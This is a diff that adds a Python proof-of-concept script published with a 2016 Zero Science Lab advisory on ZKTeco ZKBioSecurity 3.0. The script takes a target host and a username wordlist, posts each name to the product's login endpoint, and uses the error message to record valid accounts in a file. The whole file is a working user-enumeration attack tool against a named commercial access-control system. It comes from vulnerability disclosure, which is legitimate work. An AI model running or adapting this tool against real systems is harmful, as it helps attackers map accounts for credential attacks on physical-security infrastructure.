@@ -1,0 +1,107 @@
+#!/usr/bin/env python
+#
+#
+# ZKTeco ZKBioSecurity 3.0 User Enumeration Weakness
+#
+#
+# Vendor: ZKTeco Inc. | Xiamen ZKTeco Biometric Identification Technology Co.,ltd
+# Product web page: http://www.zkteco.com
+# Affected version: 3.0.1.0_R_230
+#                   Platform: 3.0.1.0_R_230
+#                   Personnel: 1.0.1.0_R_1916
+#                   Access: 6.0.1.0_R_1757
+#                   Elevator: 2.0.1.0_R_777
+#                   Visitor: 2.0.1.0_R_877
+#                   Video:2.0.1.0_R_489
+#                   Adms: 1.0.1.0_R_197
+#
+# Summary: ZKBioSecurity3.0 is the ultimate "All in One" web based security
+# platform developed by ZKTeco. It contains four integrated modules: access
+# control, video linkage, elevator control and visitor management. With an
+# optimized system architecture designed for high level biometric identification
+# and a modern-user friendly UI, ZKBioSecurity 3.0 provides the most advanced
+# solution for a whole new user experience.
+#
+# Desc: The weakness is caused due to the 'authLoginAction!login.do' script
+# enumerating the list of valid usernames when some characters are provided
+# via the 'username' parameter.
+#
+# Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+#            Microsoft Windows 7 Professional SP1 (EN)
+#            Apache-Coyote/1.1
+#            Apache Tomcat/7.0.56
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2016-5366
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5366.php
+#
+#
+# 18.07.2016
+#
+#
+
+import cookielib
+import argparse
+import urllib2
+import urllib
+import json
+import sys
+
+from colorama import Fore, Back, Style, init
+
+init()
+
+print '\n-----------------------------------------------'
+print 'User Enumeration Tool v0.2 for ZKBioSecurity'
+print 'Copyleft (c) 2016, Zero Science Lab'
+print 'by lqwrm'
+print '-----------------------------------------------\n'
+parser = argparse.ArgumentParser()
+parser.add_argument('-t', help='target IP or hostname', action='store', dest='target')
+parser.add_argument('-f', help='username wordlist', action='store', dest='file')
+
+args = parser.parse_args()
+if len(sys.argv) != 5:
+	parser.print_help()
+	sys.exit()
+
+host = args.target
+fn = args.file
+
+try:
+	users = open(args.file, 'r')
+except(IOError):
+	print '[!] Error opening \'' +fn+ '\' file.'
+	sys.exit()
+lines = users.read().splitlines()
+print '[*] Loaded %d usernames for testing.\n' % len(open(fn).readlines())
+users.close()
+cj = cookielib.CookieJar()
+opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+results = open('validusers.txt', 'w')
+for line in lines:
+	chk_usr = urllib.urlencode({'username'   : line,
+								'password'   : 'noneed',
+								'loginType'  : 'NORMAL',
+								'un'         : '1470746177485_7049',
+								'systemCode' : 'visLogin.jsp'
+								})
+	try:
+		xhr = json.load(opener.open('http://'+host+'/authLoginAction!login.do', chk_usr))
+	except:
+		print '[!] Error connecting to http://'+host
+		sys.exit()
+	print '[+] Testing username: ' +Fore.GREEN+line+Fore.RESET
+	for key, value in xhr.iteritems():
+		fnrand = value
+		break
+	if fnrand == 'Username or password is error.':
+		print '[!] Found ' +Style.BRIGHT+Fore.RED+line+Fore.RESET+Style.RESET_ALL+ ' as valid registered user.'
+		results.write('%s\n' % line)
+results.close()
+print '\n[*] Enumeration completed!'
+print '[*] Valid usernames successfully written to \'validusers.txt\' file.'
